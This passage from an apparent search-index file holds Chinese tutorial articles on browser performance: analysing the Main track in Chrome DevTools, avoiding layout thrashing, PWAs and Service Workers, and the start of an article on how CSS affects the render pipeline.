function_\">getElementById</span>(<span class=\"string\">\"mian_div\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">let</span> new_node = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">\"li\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">let</span> textnode = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createTextNode</span>(<span class=\"string\">\"time.geekbang\"</span>)</span><br><span class=\"line\">        new_node.<span class=\"title function_\">appendChild</span>(textnode);</span><br><span class=\"line\">        new_node.<span class=\"property\">offsetHeight</span> = time_li.<span class=\"property\">offsetHeight</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">\"mian_div\"</span>).<span class=\"title function_\">appendChild</span>(new_node);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>我们在一个 for 循环语句里面不断读取属性值，每次读取属性值之前都要进行计算样式和布局。执行代码之后，使用 Performance 记录的状态如下所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663b478c0ea9cb14036cafe5.png\" alt=\"Performance中关于布局抖动的表现\"></p>\n<p>从上图可以看出，在 foo 函数内部重复执行计算样式和布局，这会大大影响当前函数的执行效率。这种情况的避免方式和强制同步布局一样，都是尽量不要在修改 DOM 结构时再去查询一些相关值。</p>\n<h3 id=\"4-合理利用CSS合成动画\"><a href=\"#4-合理利用CSS合成动画\" class=\"headerlink\" title=\"4. 合理利用CSS合成动画\"></a>4. 合理利用 CSS 合成动画</h3><p>合成动画是直接在合成线程上执行的，这和在主线程上执行的布局、绘制等操作不同，如果主线程被 JavaScript 或者一些布局任务占用，CSS 动画依然能继续执行。所以要尽量利用好 CSS 合成动画，如果能让 CSS 处理动画，就尽量交给 CSS 来操作。</p>\n<p>另外，如果能提前知道对某个元素执行动画操作，那就最好将其标记为 will-change，这是告诉渲染引擎需要将该元素单独生成一个图层。</p>\n<h3 id=\"5-避免频繁的垃圾回收\"><a href=\"#5-避免频繁的垃圾回收\" class=\"headerlink\" title=\"5. 避免频繁的垃圾回收\"></a>5. 避免频繁的垃圾回收</h3><p>我们知道 JavaScript 使用了自动垃圾回收机制，如果在一些函数中频繁创建临时对象，那么垃圾回收器也会频繁地去执行垃圾回收策略。这样当垃圾回收操作发生时，就会占用主线程，从而影响到其他任务的执行，严重的话还会让用户产生掉帧、不流畅的感觉。</p>\n<p>所以要尽量避免产生那些临时垃圾数据。那该怎么做呢？可以尽可能优化储存结构，尽可能避免小颗粒对象的产生。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天就介绍到这里，下面我来总结下本文的主要内容。</p>\n<p>我们主要讲解了如何系统优化加载阶段和交互阶段的页面。</p>\n<p>在加载阶段，核心的优化原则是：优化关键资源的加载（可以使用 CDN、压缩文件）、非关键的资源（可以 async 或者 befar）、降低关键资源的 RTT 次数。</p>\n<p>在交互阶段，核心的优化原则是：尽量减少一帧的生成时间。可以通过减少单次 JavaScript 的执行时间（任务拆分减少 js 行数）、避免强制同步布局（伺机使用额外的获取布局信息）、避免布局抖动、尽量采用 CSS 的合成动画（降低重绘和重排）、避免频繁的垃圾回收（减少无用变量的声明）等方式来减少一帧生成的时长。</p>\n"},{"title":"性能分析工具：如何分析 Performance 中的 Main 指标？","url":"/browser/pages/PerformanceAnalysisTools.html","content":"<p>上节我们介绍了如何使用 Performance，而且我们还提到了性能指标面板中的 Main 指标，它详细地记录了渲染主线程上的任务执行记录，通过分析 Main 指标，我们就能够定位到页面中所存在的性能问题，本节，我们就来介绍如何分析 Main 指标。</p>\n<h2 id=\"任务-vs-过程\"><a href=\"#任务-vs-过程\" class=\"headerlink\" title=\"任务 vs 过程\"></a>任务 vs 过程</h2><p>不过在开始之前，我们要讲清楚两个概念，那就是 Main 指标中的任务和过程，在《<a href=\"/browser/pageEventLoop/MessageQueuesAndEventLoop.html\">消息队列和事件循环：页面是怎么活起来的？</a>》和《[任务调度：有了 setTimeOut，为什么还要使用 rAF？]》这两节我们分析过，渲染进程中维护了消息队列，如果通过 SetTimeout 设置的回调函数，通过鼠标点击的消息事件，都会以任务的形式添加消息队列中，然后任务调度器会按照一定规则从消息队列中取出合适的任务，并让其在渲染主线程上执行。</p>\n<p>而我们今天所分析的 Main 指标就记录渲染主线上所执行的全部<strong>任务</strong>，以及每个任务的详细执行<strong>过程</strong>。</p>\n<p>你可以打开 Chrome 的开发者工具，选择 Performance 标签，然后录制加载阶段任务执行记录，然后关注 Main 指标，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664364b00ea9cb1403038683.png\" alt=\"任务和过程\"></p>\n<p>观察上图，图上方有很多一段一段灰色横条，<strong>每个灰色横条就对应了一个任务，灰色长条的长度对应了任务的执行时长</strong>。通常，渲染主线程上的任务都是比较复杂的，如果只单纯记录任务执行的时长，那么依然很难定位问题，因此，还需要将任务执行过程中的一些关键的细节记录下来，这些细节就是任务的过程，灰线下面的横条就是一个个过程，同样这些横条的长度就代表这些过程执行的时长。</p>\n<p>直观地理解，你可以把任务看成是一个 Task 函数，在执行 Task 函数的过程中，它会调用一系列的子函数，这些子函数就是我们所提到的过程。为了让你更好地理解，我们来分析下面这个任务的图形：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664364d60ea9cb140303cdaa.png\" alt=\"单个任务\"></p>\n<p>观察上面这个任务记录的图形，你可以把该图形看成是下面 Task 函数的执行过程：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">A</span>(<span class=\"params\"></span>){</span><br><span class=\"line\">    <span class=\"title function_\">A1</span>()</span><br><span class=\"line\">    <span class=\"title function_\">A2</span>()</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Task</span>(<span class=\"params\"></span>){</span><br><span class=\"line\">    <span class=\"title function_\">A</span>()</span><br><span class=\"line\">    <span class=\"title function_\">B</span>()</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title class_\">Task</span>()</span><br></pre></td></tr></tbody></table></figure>\n\n<p>结合代码和上面的图形，我们可以得出以下信息：</p>\n<ul>\n<li>Task 任务会首先调用 A 过程；</li>\n<li>随后 A 过程又依次调用了 A1 和 A2 过程，然后 A 过程执行完毕；</li>\n<li>随后 Task 任务又执行了 B 过程；</li>\n<li>B 过程执行结束，Task 任务执行完成；</li>\n<li>从图中可以看出，A 过程执行时间最长，所以在 A1 过程时，拉长了整个任务的执行时长。</li>\n</ul>\n<h2 id=\"分析页面加载过程\"><a href=\"#分析页面加载过程\" class=\"headerlink\" title=\"分析页面加载过程\"></a>分析页面加载过程</h2><p>通过以上介绍，相信你已经掌握了如何解读 Main 指标中的任务了，那么接下来，我们就可以结合 Main 指标来分析页面的加载过程。我们先来分析一个简单的页面，代码如下所示：</p>\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Main<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">        area {</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">border</span>: <span class=\"number\">2px</span> ridge;</span></span><br><span class=\"line\"><span class=\"language-css\">        }</span></span><br><span class=\"line\"><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">        box {</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">background-color</span>: <span class=\"built_in\">rgba</span>(<span class=\"number\">106</span>, <span class=\"number\">24</span>, <span class=\"number\">238</span>, <span class=\"number\">0.26</span>);</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">height</span>: <span class=\"number\">5em</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">margin</span>: <span class=\"number\">1em</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">width</span>: <span class=\"number\">5em</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        }</span></span><br><span class=\"line\"><span class=\"language-css\">    </span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"area\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box rAF\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">function</span> <span class=\"title function_\">setNewArea</span>(<span class=\"params\"></span>) {</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">let</span> el = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">'div'</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">            el.<span class=\"title function_\">setAttribute</span>(<span class=\"string\">'class'</span>, <span class=\"string\">'area'</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">            el.<span class=\"property\">innerHTML</span> = <span class=\"string\">'&lt;div class=\"box rAF\"&gt;&lt;/div&gt;'</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"variable language_\">document</span>.<span class=\"property\">body</span>.<span class=\"title function_\">append</span>(el)</span></span><br><span class=\"line\"><span class=\"language-javascript\">        }</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"title function_\">setNewArea</span>()   </span></span><br><span class=\"line\"><span class=\"language-javascript\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>观察这段代码，我们可以看出，它只是包含了一段 CSS 样式和一段 JavaScript 内嵌代码，其中在 JavaScript 中还执行了 DOM 操作了，我们就结合这段代码来分析页面的加载流程。</p>\n<p>首先生成报告页，再观察报告页中的 Main 指标，由于阅读实际指标比较费劲，所以我手动绘制了一些关键的任务和其执行过程，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6643652b0ea9cb1403044942.png\" alt=\"Main指标\"></p>\n<p>通过上面的图形我们可以看出，加载过程主要分为三个阶段，它们分别是：</p>\n<ol>\n<li>导航阶段，该阶段主要是从网络进程接收 HTML 响应头和 HTML 响应体。</li>\n<li>解析 HTML 数据阶段，该阶段主要是将接收到的 HTML 数据转换为 DOM 和 CSSOM。</li>\n<li>生成可显示的位图阶段，该阶段主要是利用 DOM 和 CSSOM，经过计算布局、生成层树 (LayerTree)、生成绘制列表 (Paint)、完成合成等操作，生成最终的图片。<br>那么接下来，我就按照这三个步骤来介绍如何解读 Main 指标上的数据。</li>\n</ol>\n<h2 id=\"导航阶段\"><a href=\"#导航阶段\" class=\"headerlink\" title=\"导航阶段\"></a>导航阶段</h2><p>我们先来看导航阶段，不过在分析这个阶段之前，我们简要地回顾下导航流程，大致的流程是这样的：</p>\n<p>当你点击了 Performance 上的重新录制按钮之后，浏览器进程会通知网络进程去请求对应的 URL 资源；一旦网络进程从服务器接收到 URL 的响应头，便立即判断该响应头中的 content-type 字段是否属于 text/html 类型；如果是，那么浏览器进程会让当前的页面执行退出前的清理操作，比如执行 JavaScript 中的 beforunload 事件，清理操作执行结束之后就准备显示新页面了，这包括了解析、布局、合成、显示等一系列操作。</p>\n<p>因此，在导航阶段，这些任务实际上是在老页面的渲染主线程上执行的。如果你想要了解导航流程的详细细节，我建议你回顾下《<a href=\"/browser/protocol/http-navigation.html\">导航流程：从输入 URL 到页面展示，这中间发生了什么？</a>》这篇文章，在这篇文中我们有介绍导航流程，而导航阶段和导航流程又有着密切的关联。</p>\n<p>回顾了导航流程之后，我们接着来分析第一个阶段的任务图形，为了让你更加清晰观察上图中的导航阶段，我将其放大了，最终效果如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664365980ea9cb140305117f.png\" alt=\"请求HTML数据阶段\"></p>\n<p>观察上图，如果你熟悉了导航流程，那么就很容易根据图形分析出这些任务的执行流程了。</p>\n<p>具体地讲，当你点击重新加载按钮后，当前的页面会执行上图中的这个任务：</p>\n<ul>\n<li>该任务的第一个子过程就是 Send request，该过程表示网络请求已被发送。然后该任务进入了等待状态。</li>\n<li>接着由网络进程负责下载资源，当接收到响应头的时候，该任务便执行 Receive Respone 过程，该过程表示接收到 HTTP 的响应头了。</li>\n<li>接着执行 DOM 事件：pagehide、visibilitychange 和 unload 等事件，如果你注册了这些事件的回调函数，那么这些回调函数会依次在该任务中被调用。</li>\n<li>这些事件被处理完成之后，那么接下来就接收 HTML 数据了，这体现在了 Recive Data 过程，Recive Data 过程表示请求的数据已被接收，如果 HTML 数据过多，会存在多个 Receive Data 过程。<br>等到所有的数据都接收完成之后，渲染进程会触发另外一个任务，该任务主要执行 Finish load 过程，该过程表示网络请求已经完成。</li>\n</ul>\n<h2 id=\"解析HTML数据阶段\"><a href=\"#解析HTML数据阶段\" class=\"headerlink\" title=\"解析HTML数据阶段\"></a>解析 HTML 数据阶段</h2><p>好了，导航阶段结束之后，就进入到了<strong>解析 HTML 数据阶段</strong>了，这个阶段的主要任务就是通过解析 HTML 数据、解析 CSS 数据、执行 JavaScript 来生成 DOM 和 CSSOM。那么下面我们继续来分析这个阶段的图形，看看它到底是怎么执行的？同样，我也放大了这个阶段的图形，你可以观看下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664365d00ea9cb140305f540.png\" alt=\"解析HTML数据阶段\"></p>\n<p>观察上图这个图形，我们可以看出，其中一个主要的过程是 HTMLParser，顾名思义，这个过程是用来解析 HTML 文件，解析的就是上个阶段接收到的 HTML 数据。</p>\n<ol>\n<li>在 ParserHTML 的过程中，如果解析到了 script 标签，那么便进入了脚本执行过程，也就是图中的 Evalute Script。</li>\n<li>我们知道，要执行一段脚本我们需要首先编译该脚本，于是在 Evalute Script 过程中，先进入了脚本编译过程，也就是图中的 Complie Script。脚本编译好之后，就进入程序执行过程，执行全局代码时，V8 会先构造一个 anonymous 过程，在执行 anonymous 过程中，会调用 setNewArea 过程，setNewArea 过程中又调用了 createElement，由于之后调用了 document.append 方法，该方法会触发 DOM 内容的修改，所以又强制执行了 ParserHTML 过程生成的新的 DOM。</li>\n<li>DOM 生成完成之后，会触发相关的 DOM 事件，比如典型的 DOMContentLoaded，还有 readyStateChanged。</li>\n</ol>\n<p>DOM 生成之后，ParserHTML 过程继续计算样式表，也就是 Reculate Style，这就是生成 CSSOM 的过程，关于 Reculate Style 过程，你可以参考我们在《<a href=\"/browser/protocol/http/render.html\">渲染流程：HTML、CSS 和 JavaScript，是如何变成页面的？</a>》节的内容，到了这里一个完整的 ParserHTML 任务就执行结束了。</p>\n<h2 id=\"生成可显示位图阶段\"><a href=\"#生成可显示位图阶段\" class=\"headerlink\" title=\"生成可显示位图阶段\"></a>生成可显示位图阶段</h2><p>生成了 DOM 和 CSSOM 之后，就进入了第三个阶段：生成页面上的位图。通常这需要经历<strong>布局 (Layout)、分层、绘制、合成</strong>等一系列操作，同样，我将第三个阶段的流程也放大了，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664366c10ea9cb1403083f3e.png\" alt=\"生成可显示的位图\"></p>\n<p>结合上图，我们可以发现，在生成完了 DOM 和 CSSOM 之后，渲染主线程首先执行了一些 DOM 事件，诸如 readyStateChange、load、pageshow。具体的讲，如果你使用 JavaScript 监听这些事件，那么这些事件监听的函数会被渲染主线程依次调用。</p>\n<p>接下来就正式进入显示流程了，大致过程如下所示。</p>\n<ol>\n<li>首先执行布局，这个过程对应图中 Layout 过程，该过程表示布局已经完成。</li>\n<li>然后更新层树（LayerTree），这个过程对应图中的 UpdateLayerTree。</li>\n<li>接着执行绘制，这个过程对应图中的 Paint。</li>\n<li>准备每层的绘制列表之后，就需要利用绘制列表来生成相应图层的位图了，这个过程对应图中的 Composite Layer。</li>\n</ol>\n<p>走到了 Composite Layers 这步，主线程的任务就完成了，接下来主线程会将合成的任务完全教给合成线程来执行，下面是具体的过程，你也可以对照着 <strong>Composite、Raster 和 GPU</strong> 这三个指标来分析，参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6643683a0ea9cb14030b2d18.png\" alt=\"显示流程\"></p>\n<p>结合渲染流水线和上图，我们再来梳理下最终图像是怎么显示出来的。</p>\n<ol>\n<li>首先主线程执行到 Composite Layers 过程之后，便会将绘制列表等信息提交给合成线程，合成线程的执行记录你可以通过 <strong>Compositor 指标</strong>来查看。</li>\n<li>合成线程维护了一个 <strong>Raster</strong> 线程池，线程池中的每个线程称为 <strong>Rasterize</strong>，用来执行光栅化操作，对应的任务就是 Rasterize Paint。</li>\n<li>当然光栅化操作并不是在 <strong>Rasterize 线程</strong>中直接执行的，而是在 GPU 进程中执行的，因此 Rasterize 线程需要和 GPU 线程保持通信。</li>\n<li>然后 GPU 生成图像，最终这些图层会被提交给浏览器进程，浏览器进程将其合成并最终显示在页面上。</li>\n</ol>\n<h2 id=\"通用分析流程\"><a href=\"#通用分析流程\" class=\"headerlink\" title=\"通用分析流程\"></a>通用分析流程</h2><p>通过对 Main 指标的分析，我们把导航流程，解析流程和最终的显示流程都串起来了，通过 Main 指标的分析，我们对页面的加载过程执行流程又有了新的认识，虽然实际情况比这个复杂，但是万变不离其宗，所有的流程都是围绕这条线来展开的，也就是说，先经历导航阶段，然后经历 HTML 解析，最后生成最终的页面。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>本文主要的目的是让我们学会如何分析 Main 指标。通过页面加载过程的分析，就能掌握一套标准的分析 Main 指标的方法，在该方法中，我将加载过程划分为三个阶段：</p>\n<ol>\n<li>导航阶段；</li>\n<li>解析 HTML 文件阶段；</li>\n<li>生成位图阶段。</li>\n</ol>\n<p>在导航流程中，主要是处理响应头的数据，并执行一些老页面退出之前的清理操作。在解析 HTML 数据阶段，主要是解析 HTML 数据、解析 CSS 数据、执行 JavaScript 来生成 DOM 和 CSSOM。最后在生成最终显示位图的阶段，主要是将生成的 DOM 和 CSSOM 合并，这包括了<strong>布局 (Layout)、分层、绘制、合成</strong>等一系列操作。</p>\n<p>通过 Main 指标，我们完整地分析了一个页面从加载到显示的过程，了解这个流程，我们自然就会去分析页面的性能瓶颈，比如你可以通过 Main 指标来分析 JavaScript 是否执行时间过久，或者通过 Main 指标分析代码里面是否存在强制同步布局等操作，分析出来这些原因之后，我们可以有针对性地去优化我们的程序。</p>\n"},{"title":"渐进式网页应用（Progressive Web Apps，PWA）","url":"/browser/pages/ProgressiveWebApps.html","content":"<p><strong>渐进式网页应用（Progressive Web Apps，PWA）</strong>是一种使用现代 Web 技术构建的应用，它能够提供类似于原生应用体验的网页应用。PWA 核心的理念是渐进性增强，即在基本的网页功能基础上逐步添加现代 Web 特性，使得网页应用能在任何设备和任何浏览器上运行，并且在网络环境较差或者离线状态下仍可使用。</p>\n<p>PWA 通常具备以下特点：</p>\n<ol>\n<li><p>响应式设计：<br>PWA 网页设计上通常是响应式的，意味着它们能够适配各种屏幕尺寸和设备。</p>\n</li>\n<li><p>离线工作：<br>使用 Service Workers，PWA 能够在没有网络连接的情况下工作，提供核心内容和功能。</p>\n</li>\n<li><p>类似应用的交互：<br>PWA 在交互上更近似于原生应用，包括滑动手势、平滑的动画和无需页面刷新的导航体验。</p>\n</li>\n<li><p>安全性：<br>PWA 通常通过 HTTPS 协议提供服务，确保数据传输的安全性。</p>\n</li>\n<li><p>易于发现：<br>由于 PWA 本质上是网站，它们能够被搜索引擎检索到，比原生应用更容易被用户发现。</p>\n</li>\n<li><p>可安装：<br>用户可以将 PWA 添加到手机主屏幕，不需要通过应用商店进行下载。</p>\n</li>\n<li><p>自动更新：<br>PWA 可以自动更新，用户无需手动更新应用。</p>\n</li>\n<li><p>推送通知：<br>PWA 可以使用 Web 推送技术发送推送通知，提高用户参与度。</p>\n</li>\n<li><p>链接可共享：<br>PWA 的页面可以使用普通网址进行分享，用户之间分享链接时可直接访问应用的特定内容。</p>\n</li>\n</ol>\n<p>技术要点：<br>以下是构建 PWA 时通常需要的一些关键技术和特性：</p>\n<ul>\n<li>Service Workers：一种运行在 Web 应用后台的脚本，能够拦截和缓存网络请求，提供离线访问能力。</li>\n<li>Web App Manifest：一个 JSON 文件，描述了网页应用的名称、图标、起始 URL、背景色等元数据，使得 PWA 可被添加到主屏幕。</li>\n<li>应用壳（App Shell）模型：设计 PWA 时的一种方式，目的是快速加载应用的核心 UI 框架，然后动态加载内容。</li>\n<li>推送通知 API：允许应用接收和显示系统级的推送通知。</li>\n</ul>\n<h2 id=\"Web应用-VS-本地应用\"><a href=\"#Web应用-VS-本地应用\" class=\"headerlink\" title=\"Web应用 VS 本地应用\"></a>Web 应用 VS 本地应用</h2><p>那相对于本地应用，Web 页面到底缺少了什么？</p>\n<ul>\n<li>首先，Web 应用缺少离线使用能力，在离线或者在弱网环境下基本上是无法使用的。而用户需要的是沉浸式的体验，在离线或者弱网环境下能够流畅地使用是用户对一个应用的基本要求。</li>\n<li>其次，Web 应用还缺少了消息推送的能力，因为作为一个 App 厂商，需要有将消息送达到应用的能力。</li>\n<li>最后，Web 应用缺少一级入口，也就是将 Web 应用安装到桌面，在需要的时候直接从桌面打开 Web 应用，而不是每次都需要通过浏览器来打开。<br>针对以上 Web 缺陷，PWA 提出了两种解决方案：通过引入 Service Worker 来试着解决离线存储和消息推送的问题，通过引入 manifest.json 来解决一级入口的问题。下面我们就来详细分析下 Service Worker 是如何工作的。</li>\n</ul>\n<h2 id=\"什么是Service-Worker\"><a href=\"#什么是Service-Worker\" class=\"headerlink\" title=\"什么是Service Worker\"></a>什么是 Service Worker</h2><p>我们先来看看 Service Worker 是怎么解决离线存储和消息推送的问题。</p>\n<p>其实在 Service Worker 之前，WHATWG 小组就推出过用 App Cache 标准来缓存页面，不过在使用过程中 App Cache 所暴露的问题比较多，遭到多方吐槽，所以这个标准最终也只能被废弃了，可见一个成功的标准是需要经历实践考量的。</p>\n<p>所以在 2014 年的时候，标准委员会就提出了 Service Worker 的概念，它的主要思想是在页面和网络之间增加一个拦截器，用来缓存和拦截请求。整体结构如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663c94df0ea9cb14035ba5f1.png\" alt=\"Service Worker结构示意图\"></p>\n<p>在没有安装 Service Worker 之前，WebApp 都是直接通过网络模块来请求资源的。安装了 Service Worker 模块之后，WebApp 请求资源时，会先通过 Service Worker，让它判断是返回 Service Worker 缓存的资源还是重新去网络请求资源。一切的控制权都交由 Service Worker 来处理。</p>\n<h2 id=\"Service-Worker的设计思路\"><a href=\"#Service-Worker的设计思路\" class=\"headerlink\" title=\"Service Worker的设计思路\"></a>Service Worker 的设计思路</h2><p>现在我们知道 Service Worker 的主要功能就是拦截请求和缓存资源，接下来我们就从 Web 应用的需求角度来看看 Service Worker 的设计思路。</p>\n<h3 id=\"1-架构\"><a href=\"#1-架构\" class=\"headerlink\" title=\"1. 架构\"></a>1. 架构</h3><p>通过前面页面循环系统的分析，我们已经知道了 JavaScript 和页面渲染流水线的任务都是在页面主线程上执行的，如果一段 JavaScript 执行时间过久，那么就会阻塞主线程，使得渲染一帧的时间变长，从而让用户产生卡顿的感觉，这对用户来说体验是非常不好的。</p>\n<p>为了避免 JavaScript 过多占用页面主线程时长的情况，浏览器实现了 Web Worker 的功能。Web Worker 的目的是让 JavaScript 能够运行在页面主线程之外，不过由于 Web Worker 中是没有当前页面的 DOM 环境的，所以在 Web Worker 中只能执行一些和 DOM 无关的 JavaScript 脚本，并通过 postMessage 方法将执行的结果返回给主线程。所以说在 Chrome 中， Web Worker 其实就是在渲染进程中开启的一个新线程，它的生命周期是和页面关联的。</p>\n<p>“让其运行在主线程之外” 就是 Service Worker 来自 Web Worker 的一个核心思想。不过 Web Worker 是临时的，每次 JavaScript 脚本执行完成之后都会退出，执行结果也不能保存下来，如果下次还有同样的操作，就还得重新来一遍。所以 Service Worker 需要在 Web Worker 的基础之上加上储存功能。</p>\n<p>另外，由于 Service Worker 还需要会为多个页面提供服务，所以还不能把 Service Worker 和单个页面绑定起来。在目前的 Chrome 架构中，Service Worker 是运行在浏览器进程中的，因为浏览器进程生命周期是最长的，所以在浏览器的生命周期内，能够为所有的页面提供服务。</p>\n<h3 id=\"2-消息推送\"><a href=\"#2-消息推送\" class=\"headerlink\" title=\"2. 消息推送\"></a>2. 消息推送</h3><p>消息推送也是基于 Service Worker 来实现的。因为消息推送时，浏览器页面也许并没有启动，这时就需要 Service Worker 来接收服务器推送的消息，并将消息通过一定方式展示给用户。关于消息推送的细节这里我们就不详述了，如果你感兴趣的话可以自行搜索相关资料去学习。</p>\n<h3 id=\"3-安全\"><a href=\"#3-安全\" class=\"headerlink\" title=\"3. 安全\"></a>3. 安全</h3><p>基于 Web 应用的业务越来越多了，其安全问题是不可忽视的，所以在设计 Service Worker 之初，安全问题就被提上了日程。</p>\n<p>关于安全，其中最为核心的一条就是 HTTP。我们知道，HTTP 采用的是明文传输信息，存在被窃听、被篡改和被劫持的风险，在项目中使用 HTTP 来传输数据无疑是 “裸奔”。所以在设计之初，就考虑对 Service Worker 采用 HTTPS 协议，因为采用 HTTPS 的通信数据都是经过加密的，即便拦截了数据，也无法破解数据内容，而且 HTTPS 还有校验机制，通信双方很容易知道数据是否被篡改。关于 HTTPS 协议，我们会在最后的安全模块详细介绍。</p>\n<p>所以要使站点支持 Service Worker，首先必要的一步就是要将站点升级到 HTTPS。</p>\n<p>除了必须要使用 HTTPS，Service Worker 还需要同时支持 Web 页面默认的安全策略，诸如同源策略、内容安全策略（CSP）等，关于这些，后续我们也会详细介绍。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天就介绍到这里，下面我来总结下本文的主要内容。</p>\n<p>我们先分析了 PWA，它是由很多技术组成的一个理念，其核心思想是渐进式。对于开发者，它提供了非常温和的方式，让开发者将普通的站点逐步过渡到 Web 应用。对于技术本身而言，它是渐进式演进，逐渐将 Web 技术发挥到极致的同时，也逐渐缩小和本地应用的差距。在此基础上，我们又分析了 PWA 中的 Service Worker 的设计思路。</p>\n<p>另外，PWA 还提供了 manifest.json 配置文件，可以让开发者自定义桌面的图标、显示名称、启动方式等信息，还可以设置启动画面、页面主题颜色等信息。关于 manifest.json 的配置还是比较简单的，详细使用教程网上有很多，这里我就不做介绍了。</p>\n<p>添加桌面标、增加离线缓存、增加消息推送等功能是 PWA 走向设备的必备功能，但我认为真正决定 PWA 能否崛起的还是底层技术，比如页面渲染效率、对系统设备的支持程度、WebAssembly 等，而这些技术也在渐进式进化过程中。所以未来如何，我们拭目以待。</p>\n<p>总之，PWA 是将传统网页与原生应用体验结合的开发模式，它利用了 Web 平台的许多优势，为用户带来更好的体验，同时简化了开发者的发布和维护工作。随着 Web 技术的不断发展，PWA 的功能和性能正在逐渐接近原生应用。</p>\n"},{"title":"渲染流水线：CSS 如何影响首次加载时的白屏时间？","url":"/browser/pages/RenderPipeline.html","content":"<p>在<a href=\"/browser/pages/DOMTree.html\">上一篇文章</a>中我们详细介绍了 DOM 的生成过程，并结合具体例子分析了 JavaScript 是如何阻塞 DOM 生成的。那本文我们就继续深入聊聊渲染流水线中的 CSS。因为 CSS 是页面中非常重要的资源，它决定了页面最终显示出来的效果，并影响着用户对整个网站的第一体验。所以，搞清楚浏览器中的 CSS 是怎么工作的很有必要，只有理解了 CSS 是如何工作的，你才能更加深刻地理解如何去优化页面。</p>\n<p>本文我们先站在渲染流水线的视角来介绍 CSS 是如何工作的，然后通过 CSS 的工作流程来分析性能瓶颈，最后再来讨论如何减少首次加载时的白屏时间。</p>\n<h2 id=\"渲染流水线视角下的CSS\"><a href=\"#渲染流水线视角下的CSS\" class=\"headerlink\" title=\"渲染流水线视角下的CSS\"></a>渲染流水线视角下的 CSS</h2><p>我们先结合下面代码来看看最简单的渲染流程：</p>\n<figure class=\"highlight css\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">//theme<span class=\"selector-class\">.css</span></span><br><span class=\"line\"><span class=\"selector-tag\">div</span>{ </span><br><span class=\"line\">    <span class=\"attribute\">color</span> : coral;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>:black</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span 